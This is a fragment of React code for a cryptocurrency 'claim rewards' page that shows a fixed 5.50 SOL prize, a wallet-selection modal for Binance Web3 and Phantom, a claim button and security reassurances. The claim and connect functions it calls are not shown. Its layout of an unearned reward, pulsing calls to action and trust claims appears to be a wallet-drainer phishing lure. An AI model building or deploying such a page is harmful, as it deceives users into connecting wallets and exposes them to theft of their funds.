              backgroundClip: 'text',
              marginBottom: '20px',
              minHeight: '40px'
            }}>
              {typewriterText}
              <span style={{ 
                animation: 'blink 1s step-end infinite',
                WebkitTextFillColor: '#667eea'
              }}>|</span>
            </h1>
            
            <p style={{
              color: '#4b5563',
              fontSize: '16px',
              lineHeight: '1.6',
              marginBottom: '30px'
            }}>
              Thank you for your participation! Connect your wallet to claim your well-deserved rewards.
            </p>
            
            <div style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              padding: '30px',
              borderRadius: '16px',
              textAlign: 'center',
              marginBottom: '30px',
              boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)',
              position: 'relative',
              overflow: 'hidden',
              border: '2px solid rgba(255,255,255,0.3)'
            }}>
              <div style={{
                position: 'absolute',
                top: '-50%',
                left: '-50%',
                width: '200%',
                height: '200%',
                background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent)',
                animation: 'spin 8s linear infinite',
                zIndex: 1
              }} />
              
              <div style={{
                color: 'rgba(255,255,255,0.9)',
                fontSize: '14px',
                marginBottom: '8px',
                textTransform: 'uppercase',
                letterSpacing: '1px',
                fontWeight: '600',
                zIndex: 2,
                position: 'relative'
              }}>
                Your Reward
              </div>
              
              <div style={{
                color: 'white',
                fontSize: '48px',
                fontWeight: 'bold',
                textShadow: '0 2px 15px rgba(0,0,0,0.3)',
                zIndex: 2,
                position: 'relative'
              }}>
                5.50 SOL
              </div>
              
              <div style={{
                color: 'rgba(255,255,255,0.8)',
                fontSize: '14px',
                marginTop: '8px',
                zIndex: 2,
                position: 'relative'
              }}>
                ≈ ${(5.50 * 150).toFixed(2)} USD
              </div>
              
              {tokenBalance !== null && (
                <div style={{
                  marginTop: '12px',
                  padding: '8px 16px',
                  background: 'rgba(255,255,255,0.2)',
                  borderRadius: '8px',
                  fontSize: '12px',
                  color: 'white',
                  backdropFilter: 'blur(5px)',
                  border: '1px solid rgba(255,255,255,0.3)',
                  zIndex: 2,
                  position: 'relative'
                }}>
                  💰 Current Balance: {tokenBalance.toFixed(4)} SOL
                </div>
              )}
            </div>
            
            {walletAddress && (
              <div style={{
                background: 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)',
                border: '2px solid #6ee7b7',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                boxShadow: '0 4px 12px rgba(16, 185, 129, 0.2)',
                animation: 'slideUp 0.4s ease-out'
              }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ 
                    fontSize: '12px', 
                    color: '#065f46', 
                    marginBottom: '4px',
                    fontWeight: '600',
                    textTransform: 'uppercase',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px'
                  }}>
                    <span>✓</span> Connected Wallet
                  </div>
                  <div style={{ 
                    fontSize: '14px', 
                    fontWeight: 'bold', 
                    color: '#047857',
                    fontFamily: 'monospace',
                    wordBreak: 'break-all',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px'
                  }}>
                    <span>👛</span>
                    {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                  </div>
                </div>
                <button
                  onClick={handleDisconnect}
                  style={{
                    background: '#dc2626',
                    color: 'white',
                    border: 'none',
                    padding: '8px 16px',
                    borderRadius: '8px',
                    fontSize: '12px',
                    fontWeight: 'bold',
                    cursor: 'pointer',
                    marginLeft: '12px',
                    flexShrink: 0,
                    transition: 'all 0.2s',
                    boxShadow: '0 2px 6px rgba(220, 38, 38, 0.3)'
                  }}
                  onMouseOver={(e) => e.target.style.background = '#b91c1c'}
                  onMouseOut={(e) => e.target.style.background = '#dc2626'}
                >
                  🔌 Disconnect
                </button>
              </div>
            )}
            
            {showClaimButton && !claiming && !claimStatus && (
              <button
                onClick={claimRewards}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                  color: 'white',
                  border: 'none',
                  padding: '18px',
                  borderRadius: '12px',
                  fontSize: '18px',
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  transition: 'all 0.3s',
                  boxShadow: '0 8px 20px rgba(16, 185, 129, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '1px',
                  marginBottom: '20px',
                  animation: 'pulse 2s infinite'
                }}
                onMouseOver={(e) => {
                  e.target.style.transform = 'scale(1.02)';
                  e.target.style.boxShadow = '0 12px 28px rgba(16, 185, 129, 0.5)';
                }}
                onMouseOut={(e) => {
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 8px 20px rgba(16, 185, 129, 0.4)';
                }}
              >
                🎁 CLAIM REWARDS
              </button>
            )}
            
            {claimStatus && (
              <div style={{
                background: claimStatus.includes('❌') ? 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)' : 
                        claimStatus.includes('🎉') ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
                        'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                border: claimStatus.includes('❌') ? '2px solid #f87171' : 
                        claimStatus.includes('🎉') ? '2px solid #6ee7b7' : 
                        '2px solid #fbbf24',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                color: claimStatus.includes('❌') ? '#b91c1c' : 
                        claimStatus.includes('🎉') ? '#065f46' : 
                        '#92400e',
                fontSize: '14px',
                fontWeight: '500',
                lineHeight: '1.5',
                whiteSpace: 'pre-line',
                boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
                animation: 'slideUp 0.3s ease-out'
              }}>
                {claimStatus}
              </div>
            )}
            
            {connecting && connectionStatus && (
              <div style={{
                background: 'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                border: '2px solid #fbbf24',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                color: '#92400e',
                fontSize: '14px',
                fontWeight: '600',
                lineHeight: '1.6',
                whiteSpace: 'pre-line',
                boxShadow: '0 4px 12px rgba(251, 191, 36, 0.2)',
                animation: 'slideUp 0.3s ease-out'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '10px'
                }}>
                  <div style={{
                    width: '24px',
                    height: '24px',
                    border: '3px solid #92400e',
                    borderTopColor: 'transparent',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    flexShrink: 0,
                    marginTop: '2px'
                  }} />
                  <div style={{ flex: 1 }}>{connectionStatus}</div>
                </div>
              </div>
            )}
            
            {debugInfo.length > 0 && (
              <div style={{
                background: '#f3f4f6',
                border: '2px solid #e5e7eb',
                borderRadius: '12px',
                padding: '12px',
                marginBottom: '20px',
                maxHeight: '180px',
                overflowY: 'auto',
                fontSize: '11px',
                fontFamily: 'monospace',
                color: '#374151',
                boxShadow: 'inset 0 0 10px rgba(0,0,0,0.1)'
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  marginBottom: '8px',
                  position: 'sticky',
                  top: 0,
                  background: '#f3f4f6',
                  paddingBottom: '4px',
                  zIndex: 1
                }}>
                  <strong style={{ fontSize: '12px', color: '#1f2937' }}>🔍 Debug Log:</strong>
                  <button
                    onClick={copyDebugInfo}
                    style={{
                      background: '#6b7280',
                      color: 'white',
                      border: 'none',
                      padding: '4px 8px',
                      borderRadius: '4px',
                      fontSize: '10px',
                      cursor: 'pointer',
                      transition: 'all 0.2s',
                      fontWeight: 'bold'
                    }}
                    onMouseOver={(e) => e.target.style.background = '#4b5563'}
                    onMouseOut={(e) => e.target.style.background = '#6b7280'}
                  >
                    📋 Copy Log
                  </button>
                </div>
                {debugInfo.map((info, i) => (
                  <div key={i} style={{ 
                    padding: '3px 0', 
                    borderBottom: i < debugInfo.length - 1 ? '1px solid #e5e7eb' : 'none',
                    fontSize: '10px',
                    lineHeight: '1.4',
                    color: info.includes('✅') ? '#059669' : 
                           info.includes('⚠️') ? '#ca8a04' : 
                           info.includes('❌') ? '#dc2626' : '#4b5563'
                  }}>
                    {info}
                  </div>
                ))}
              </div>
            )}
            
            <button
              onClick={() => setShowModal(true)}
              disabled={connecting || walletAddress}
              style={{
                width: '100%',
                background: walletAddress 
                  ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
                  : connecting
                  ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
                  : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                color: 'white',
                border: 'none',
                padding: '18px',
                borderRadius: '12px',
                fontSize: '18px',
                fontWeight: 'bold',
                cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
                transition: 'all 0.3s',
                boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
                textTransform: 'uppercase',
                letterSpacing: '1px',
                opacity: connecting || walletAddress ? 0.7 : 1,
                transform: 'scale(1)'
              }}
              onMouseOver={(e) => {
                if (!connecting && !walletAddress) {
                  e.target.style.transform = 'scale(1.02)';
                  e.target.style.boxShadow = '0 12px 28px rgba(102, 126, 234, 0.5)';
                }
              }}
              onMouseOut={(e) => {
                if (!connecting && !walletAddress) {
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 8px 20px rgba(102, 126, 234, 0.4)';
                }
              }}
            >
              {connecting ? '⏳ CONNECTING...' : walletAddress ? '✅ WALLET CONNECTED' : '🚀 CONNECT WALLET'}
            </button>
            
            {!walletAddress && !connecting && (
              <p style={{
                marginTop: '16px',
                fontSize: '12px',
                color: '#6b7280',
                textAlign: 'center',
                lineHeight: '1.5'
              }}>
                🔐 Secured connection • By connecting, you agree to our Terms of Service
              </p>
            )}
          </div>
          
          <div style={{
            marginTop: '24px',
            textAlign: 'center',
            color: 'rgba(255,255,255,0.85)',
            fontSize: '13px',
            lineHeight: '1.5'
          }}>
            <p>🔒 Powered by WalletConnect v2 • Binance Web3 Wallet</p>
            <p style={{ marginTop: '4px', opacity: 0.8, fontSize: '12px' }}>
              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • Project ID: {WC_PROJECT_ID.substring(0, 8)}...
            </p>
            <p style={{ marginTop: '4px', fontSize: '11px', opacity: 0.7 }}>
              ⚠️ Always verify connection requests in your wallet app
            </p>
          </div>
        </div>
      )}
      
      {showModal && (
        <div
          onClick={() => !connecting && setShowModal(false)}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.75)',
            backdropFilter: 'blur(8px)',
            zIndex: 100,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px',
            animation: 'fadeIn 0.2s',
            WebkitTapHighlightColor: 'transparent'
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: 'white',
              borderRadius: '24px',
              padding: '30px',
              maxWidth: '400px',
              width: '100%',
              boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
              animation: 'slideUp 0.3s ease-out',
              border: '1px solid rgba(255,255,255,0.2)',
              position: 'relative',
              overflow: 'hidden'
            }}
          >
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '24px'
            }}>
              <h2 style={{
                fontSize: '24px',
                fontWeight: 'bold',
                color: '#1f2937',
                margin: 0,
                display: 'flex',
                alignItems: 'center',
                gap: '10px'
              }}>
                <span>👛</span> Select Wallet
              </h2>
              <button
                onClick={() => setShowModal(false)}
                disabled={connecting}
                style={{
                  background: 'transparent',
                  border: 'none',
                  fontSize: '28px',
                  color: '#9ca3af',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  padding: '0',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderRadius: '8px',
                  transition: 'all 0.2s'
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.background = '#f3f4f6';
                    e.target.style.color = '#1f2937';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.background = 'transparent';
                    e.target.style.color = '#9ca3af';
                  }
                }}
              >
                ×
              </button>
            </div>
            
            <p style={{
              color: '#6b7280',
              fontSize: '14px',
              marginBottom: '24px',
              lineHeight: '1.5',
              textAlign: 'center'
            }}>
              Choose your preferred wallet to connect and claim your rewards
            </p>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <button
                onClick={connectBinanceWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #f0b90b 0%, #f8d12f 100%)',
                  color: '#1e1e1e',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  transition: 'all 0.3s',
                  boxShadow: '0 4px 12px rgba(240, 185, 11, 0.3)',
                  opacity: connecting ? 0.6 : 1,
                  position: 'relative',
                  overflow: 'hidden'
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(-2px)';
                    e.target.style.boxShadow = '0 6px 16px rgba(240, 185, 11, 0.4)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(0)';
                    e.target.style.boxShadow = '0 4px 12px rgba(240, 185, 11, 0.3)';
                  }
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px',
                  flexShrink: 0,
                  boxShadow: '0 2px 6px rgba(0,0,0,0.1)'
                }}>
                  🟡
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Binance Web3 Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.8, marginTop: '2px' }}>
                    Recommended • Mobile App • Discover Tab
                  </div>
                </div>
              </button>
              
              <button
                onClick={connectPhantomWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #ab9ff2 0%, #9281f5 100%)',
                  color: 'white',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  transition: 'all 0.3s',
                  boxShadow: '0 4px 12px rgba(171, 159, 242, 0.3)',
                  opacity: connecting ? 0.6 : 1,
                  position: 'relative',
                  overflow: 'hidden'
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(-2px)';
                    e.target.style.boxShadow = '0 6px 16px rgba(171, 159, 242, 0.4)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(0)';
                    e.target.style.boxShadow = '0 4px 12px rgba(171, 159, 242, 0.3)';
                  }
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px',
                  flexShrink: 0,
                  boxShadow: '0 2px 6px rgba(0,0,0,0.1)'
                }}>
                  👻
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Phantom Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.9, marginTop: '2px' }}>
                    Solana • Browser Extension • Mobile App
                  </div>
                </div>
              </button>
            </div>
            
            <div style={{
              marginTop: '24px',
              padding: '16px',
              background: '#f9fafb',
              borderRadius: '12px',
              fontSize: '12px',
              color: '#6b7280',
              lineHeight: '1.5',
              border: '1px solid #e5e7eb'
            }}>
              <div style={{ fontWeight: '600', color: '#374151', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span>🔐</span> Safe & Secure
              </div>
              <div>
                We never store your private keys. Your wallet credentials remain secure and under your control at all times. All transactions require your explicit approval.
              </div>
            </div>
            
            <div style={{
              marginTop: '16px',
              padding: '12px',
              background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
              borderRadius: '12px',
              fontSize: '11px',
              color: '#1e40af',
              textAlign: 'center',
              border: '1px solid #93c5fd'
            }}>
              💡 <strong>Pro Tip:</strong> Binance Web3 Wallet provides the best experience for this rewards claim process with seamless integration.
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
